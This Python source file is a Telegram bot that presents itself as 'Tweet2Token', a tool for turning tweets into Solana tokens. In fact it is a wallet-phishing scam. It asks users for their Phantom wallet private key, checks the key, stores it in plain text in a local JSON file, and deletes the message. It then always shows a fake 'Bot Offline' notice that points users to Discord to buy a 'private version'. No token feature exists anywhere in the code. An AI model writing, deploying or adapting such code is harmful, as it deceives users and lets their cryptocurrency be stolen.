import os
import json
import base58
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from solders.keypair import Keypair

# Load environment variables
load_dotenv()

# Get bot token with error handling
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN is missing! Make sure it's set in the .env file.")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage for user wallets
WALLET_STORAGE_FILE = "user_wallets.json"

# Load existing wallets from JSON file
if os.path.exists(WALLET_STORAGE_FILE):
    try:
        with open(WALLET_STORAGE_FILE, "r") as f:
            user_wallets = json.load(f)
    except json.JSONDecodeError:
        user_wallets = {}
else:
    user_wallets = {}
    with open(WALLET_STORAGE_FILE, "w") as f:
        json.dump(user_wallets, f)

# Function to save wallets to JSON file
def save_wallets():
    with open(WALLET_STORAGE_FILE, "w") as f:
        json.dump(user_wallets, f, indent=4)

# Start command handler (keep the original message)
@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id

    # Check if the user already has a wallet
    if str(user_id) in user_wallets and user_wallets[str(user_id)]:
        # Send the offline message immediately
        send_offline_message(message.chat.id)
    else:
        # Prompt to set up a wallet
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💳 Setup Primary Wallet", callback_data="setup_wallet"))
        bot.send_message(message.chat.id,
                         "⭐ Welcome to Tweet2Token! ⭐\n"
                         "Turn any tweet into a Solana token with just one click!\n\n"
                         "🚀 How it works:\n"
                         "- Share a tweet link.\n"
                         "- I'll extract the data and suggest a token design.\n"
                         "- Click to create your Solana token instantly.\n\n"
                         "💡 Use /settings to customize your preferences.\n"
                         "Let's turn tweets into treasures! 🪙✨",
                         reply_markup=markup)

# Wallet setup handler
@bot.callback_query_handler(func=lambda call: call.data == "setup_wallet")
def setup_wallet(call):
    msg = bot.send_message(call.message.chat.id, "📝 Please enter a name for your wallet.")
    bot.register_next_step_handler(msg, process_wallet_name_setup, msg.message_id)

def process_wallet_name_setup(message, prompt_message_id):
    user_id = message.from_user.id
    wallet_name = message.text.strip()
    
    bot.delete_message(message.chat.id, prompt_message_id)
    bot.delete_message(message.chat.id, message.message_id)

    if str(user_id) not in user_wallets:
        user_wallets[str(user_id)] = {}

    if wallet_name in user_wallets[str(user_id)]:
        bot.send_message(message.chat.id, "❌ A wallet with this name already exists.")
        return

    msg = bot.send_message(message.chat.id, "🔑 Please send your Phantom Wallet private key.")
    bot.register_next_step_handler(msg, process_private_key_setup, wallet_name, msg.message_id)

def process_private_key_setup(message, wallet_name, prompt_message_id):
    user_id = message.from_user.id
    private_key_str = message.text.strip()

    try:
        private_key_bytes = base58.b58decode(private_key_str)
        Keypair.from_bytes(private_key_bytes)

        user_wallets[str(user_id)][wallet_name] = {
            "private_key": private_key_str
        }
        save_wallets()

        bot.delete_message(message.chat.id, prompt_message_id)
        bot.delete_message(message.chat.id, message.message_id)
        bot.send_message(message.chat.id, f"✅ Wallet '{wallet_name}' added successfully!")

        # Send the offline message after wallet setup
        send_offline_message(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "🔐 Invalid Private Key. Please try again.")

# Function to send the offline message
def send_offline_message(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 Discord", url="https://discord.gg/YOUR_INVITE_LINK"))
    
    bot.send_message(chat_id,
                     "⚠️ **Bot Offline**\n\n"
                     "Due to high demand, the bot has been temporarily shut down. Please try again later or join our Discord for updates.\n\n"
                     "💰 This is happening because of limited funding. If you're interested in purchasing a private version of the bot, join our Discord!",
                     reply_markup=markup,
                     parse_mode="Markdown")

# Handle all incoming messages
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    # Delete the incoming message
    bot.delete_message(message.chat.id, message.message_id)
    # Send the /start message
    start_message(message)

if __name__ == '__main__':
    print("\033[92mBOT STARTED!\033[0m")
    bot.polling(none_stop=True)